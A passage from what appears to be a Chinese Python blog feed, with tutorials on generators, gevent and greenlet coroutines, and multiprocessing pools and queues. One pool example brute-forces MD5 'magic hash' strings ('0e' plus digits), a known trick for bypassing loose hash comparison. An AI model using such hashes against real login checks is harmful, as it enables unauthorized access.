nums</span><br><span class="line">Out[<span class="number">2</span>]: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: nums = (x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: nums</span><br><span class="line">Out[<span class="number">4</span>]: &lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x000001DC00D7AF20</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>如果一个函数中，存在yield语句，那么它就不是一个函数而是一个生成器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_num</span>(<span class="params">all_num</span>):</span></span><br><span class="line">    a, b, current_num = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">generator = create_num(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#generator就是一个生成器对象</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> generator:</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><h5 id="生成器也是一个特殊的迭代器-使用next函数访问"><a href="#生成器也是一个特殊的迭代器-使用next函数访问" class="headerlink" title="生成器也是一个特殊的迭代器(使用next函数访问)"></a>生成器也是一个特殊的迭代器(使用next函数访问)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_num</span>(<span class="params">all_num</span>):</span></span><br><span class="line">    a, b, current_num = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok ...&quot;</span></span><br><span class="line"></span><br><span class="line">generator = create_num(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">102</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">next</span>(generator))</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h5 id="send唤醒"><a href="#send唤醒" class="headerlink" title="send唤醒"></a>send唤醒</h5><p>send与next的区别，send可以向生成器中传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_num</span>(<span class="params">all_num</span>):</span></span><br><span class="line">    a, b, current_num = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        ret = <span class="keyword">yield</span> a</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok ...&quot;</span></span><br><span class="line"></span><br><span class="line">generator = create_num(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))</span><br><span class="line"><span class="built_in">print</span>(generator.send(<span class="string">&quot;传参&quot;</span>))</span><br></pre></td></tr></table></figure><p>第一次启动生成器，如果使用send，不能传值。第一次建议使用next，非要使用send，可以传入None这个空值。</p><h3 id="使用yield完成多任务"><a href="#使用yield完成多任务" class="headerlink" title="使用yield完成多任务"></a>使用yield完成多任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_1</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---1---&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_2</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---2---&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    t1 = task_1()</span><br><span class="line">    t2 = task_2()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">next</span>(t1)</span><br><span class="line">        <span class="built_in">next</span>(t2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="使用greenlet完成多任务"><a href="#使用greenlet完成多任务" class="headerlink" title="使用greenlet完成多任务"></a>使用greenlet完成多任务</h3><p>安装greenlet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install greenlet</span><br></pre></td></tr></table></figure><p>greenlet</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---A---&quot;</span>)</span><br><span class="line">        gr2.switch()</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---B---&quot;</span>)</span><br><span class="line">        gr1.switch()</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">gr1 = greenlet(test1)</span><br><span class="line">gr2 = greenlet(test2)</span><br><span class="line">gr1.switch()</span><br></pre></td></tr></table></figure><p>greenlet已经实现了协程，但是还需要人工切换。gevent可以自动切换</p><h3 id="使用gevent完成多任务"><a href="#使用gevent完成多任务" class="headerlink" title="使用gevent完成多任务"></a>使用gevent完成多任务</h3><p>安装gevent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gevent</span><br></pre></td></tr></table></figure><p>简单实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">print</span>(gevent.getcurrent(),i)</span><br><span class="line">        <span class="comment">#只有使用gevent.sleep才会切换</span></span><br><span class="line">        gevent.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><h4 id="给程序打补丁"><a href="#给程序打补丁" class="headerlink" title="给程序打补丁"></a>给程序打补丁</h4><p><code>monkey.patch_all()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="comment">#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">print</span>(gevent.getcurrent(),i)</span><br><span class="line">        <span class="comment">#只有使用gevent.sleep才会切换</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><p>简洁写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="comment">#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">print</span>(gevent.getcurrent(),i)</span><br><span class="line">        <span class="comment">#只有使用gevent.sleep才会切换</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gevent.joinall([gevent.spawn(f,<span class="number">5</span>),gevent.spawn(f,<span class="number">5</span>),gevent.spawn(f,<span class="number">5</span>)])</span><br></pre></td></tr></table></figure><h3 id="案例-图片下载器（利用协程提高速度）"><a href="#案例-图片下载器（利用协程提高速度）" class="headerlink" title="案例-图片下载器（利用协程提高速度）"></a>案例-图片下载器（利用协程提高速度）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="comment">#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_img</span>(<span class="params">url</span>):</span></span><br><span class="line">    req = urllib.request.urlopen(url)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(url[-<span class="number">8</span>:],<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(req.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    gevent.joinall([</span><br><span class="line">        gevent.spawn(download_img,<span class="string">&quot;https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg&quot;</span>),</span><br><span class="line">        gevent.spawn(download_img,<span class="string">&quot;https://www.venustech.com.cn/u/cms/www/202106/11174004guxu.png&quot;</span>),</span><br><span class="line">        gevent.spawn(download_img,<span class="string">&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="进程、线程、协程对比"><a href="#进程、线程、协程对比" class="headerlink" title="进程、线程、协程对比"></a>进程、线程、协程对比</h3><ol><li>进程是资源分配的单位</li><li>线程是操作系统调度的单位</li><li>进程切换需要的资源很大，效率很低</li><li>线程切换需要的资源一般，效率一般（不考虑GIL情况下）</li><li>协程切换任务资源很小，效率高</li><li>多进程、多线程根据CPU核数不一样可能是并行，但是协程是在一个线程中 所以是并发</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有元素被访问完结束。迭代器只能往前不会后退。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;判断是否可迭代&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="Python3" scheme="https://xin02.github.io/categories/Python3/"/>
    
    
    <category term="协程" scheme="https://xin02.github.io/tags/%E5%8D%8F%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Python3 多进程</title>
    <link href="https://xin02.github.io/2021/06/16/Python3-%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>https://xin02.github.io/2021/06/16/Python3-%E5%A4%9A%E8%BF%9B%E7%A8%8B/</id>
    <published>2021-06-16T06:38:14.000Z</published>
    <updated>2022-07-01T12:29:49.315Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是进程？"><a href="#什么是进程？" class="headerlink" title="什么是进程？"></a>什么是进程？</h3><ul><li><p>程序：一个未运行的二进制文件，叫做程序。如Windows下的PE文件</p></li><li><p>进程：二进制文件运行后，文件本身以及用到的资源称为进程，他是操作系统分配资源的基本单元。</p></li><li><p>多任务：不止可以通过线程完成多任务，还可以通过进程完成多任务。</p></li></ul><h3 id="使用Process实现多进程"><a href="#使用Process实现多进程" class="headerlink" title="使用Process实现多进程"></a>使用Process实现多进程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">test</span>):</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是&#123;&#125;&quot;</span>.<span class="built_in">format</span>(test))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p1 = Process(target=test,kwargs=&#123;<span class="string">&quot;test&quot;</span>:<span class="string">&quot;t1&quot;</span>&#125;)</span><br><span class="line">    p2 = Process(target=test,kwargs=&#123;<span class="string">&quot;test&quot;</span>:<span class="string">&quot;t2&quot;</span>&#125;)</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="通过队列完成进程间通信"><a href="#通过队列完成进程间通信" class="headerlink" title="通过队列完成进程间通信"></a>通过队列完成进程间通信</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue,Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queue_put</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PID:&#123;&#125; ,&#123;&#125; 已存入队列，当前队列共&#123;&#125;个元素&quot;</span>.<span class="built_in">format</span>(os.getpid(),i,q.qsize()))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queue_get</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PID:&#123;&#125; ,&#123;&#125; 已取出队列，当前队列共&#123;&#125;个元素&quot;</span>.<span class="built_in">format</span>(os.getpid(),q.get(),q.qsize()))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    q = Queue(<span class="number">5</span>)<span class="comment">#创建一个队列，队列可以存储5个数据</span></span><br><span class="line">    <span class="comment"># q.put(&quot;a&quot;)#向队列中添加数据，如果队列存满，程序会阻塞等待</span></span><br><span class="line">    <span class="comment"># q.get()#从队列中获取数据，如果队列为空，程序会阻塞等待</span></span><br><span class="line">    <span class="comment"># #q.put_nowait()如果队列存满，程序会报异常</span></span><br><span class="line">    <span class="comment"># #q.get_nowait()如果队列为空，程序会报异常</span></span><br><span class="line">    <span class="comment"># q.qsize()#取出队列中数据个数</span></span><br><span class="line">    <span class="comment"># q.empty()#判断队列是否为空</span></span><br><span class="line">    <span class="comment"># q.full()#判断队列是否存满</span></span><br><span class="line">    p1 = Process(target=queue_put,args=(q,))</span><br><span class="line">    p2 = Process(target=queue_get,args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js_hash</span>(<span class="params">s</span>):</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    md5 = md5.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0e&#x27;</span> == md5[<span class="number">0</span>:<span class="number">2</span>] <span class="keyword">and</span> md5[<span class="number">2</span>:].isdecimal():</span><br><span class="line">        <span class="built_in">print</span>(s,md5)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool(<span class="number">5</span>)<span class="comment">#创建一个进程池，最大进程数5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">99999999999999</span>):</span><br><span class="line">        s = <span class="string">&#x27;0e&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        p.apply_async(js_hash, args=(s,))<span class="comment">#apply_async(要调用的目标,args=(传递的参数,))</span></span><br><span class="line">    p.close()<span class="comment">#关闭进程池，关闭后进程池不再接受新的请求</span></span><br><span class="line">    p.join()<span class="comment">#等待所有子进程执行完毕，必须放在close语句后</span></span><br></pre></td></tr></table></figure><h3 id="案例：多任务文件copy"><a href="#案例：多任务文件copy" class="headerlink" title="案例：多任务文件copy"></a>案例：多任务文件copy</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Manager</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_file</span>(<span class="params">q,file_name,old_dir,new_dir</span>):</span></span><br><span class="line">    <span class="comment">#print(&quot;将 &#123;&#125; 文件复制到 &#123;&#125; 目录下&quot;.format(file_name,new_dir))</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(old_dir + <span class="string">&quot;\\&quot;</span> + file_name):</span><br><span class="line">        <span class="comment"># print(file_name,&quot;是个目录&quot;)</span></span><br><span class="line">        q.put(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#print(file_name,&quot;是个文件&quot;)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(old_dir + <span class="string">&quot;\\&quot;</span> + file_name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(new_dir + <span class="string">&quot;\\&quot;</span> + file_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file_new:</span><br><span class="line">                file_new.write(file.read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 1、获取要拷贝的文件名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;注意！此程序不完善，尚不能copy文件夹中文件夹的文件&quot;</span>)</span><br><span class="line">    old_dir = <span class="built_in">input</span>(<span class="string">r&quot;输入需要copy的源文件夹路径,如(C:\null):&quot;</span>)</span><br><span class="line">    <span class="comment"># 2、创建新文件夹</span></span><br><span class="line">    new_dir = <span class="built_in">input</span>(<span class="string">r&quot;输入需要copy的目标文件夹路径,如(C:\null_副件):&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.mkdir(new_dir)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 3、获取所有需要copy文件名</span></span><br><span class="line">    files_name = os.listdir(old_dir)</span><br><span class="line">    <span class="comment"># 4、创建进程池</span></span><br><span class="line">    po = Pool(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># 进程池使用队列需要使用Manager类下的Queue</span></span><br><span class="line">    q = Manager().Queue()</span><br><span class="line">    <span class="comment"># 5、向进程池添加复制文件的任务</span></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> files_name:</span><br><span class="line">        po.apply_async(copy_file,args=(q,file_name,old_dir,new_dir))</span><br><span class="line">    po.close()</span><br><span class="line">    <span class="comment">#po.join()</span></span><br><span class="line">    copy_ok = <span class="number">0</span></span><br><span class="line">    copy_num = <span class="built_in">len</span>(files_name)</span><br><span class="line">    folders = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        copy_ok += <span class="number">1</span></span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r拷贝进度:&#123;:.2f&#125;%&quot;</span>.<span class="built_in">format</span>(copy_ok*<span class="number">100</span>/copy_num))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            folders.append(q.get_nowait())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#将未拷贝的文件夹存入列表</span></span><br><span class="line">        <span class="keyword">if</span> copy_ok &gt;= copy_num:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n以下文件夹未复制:&quot;</span>,<span 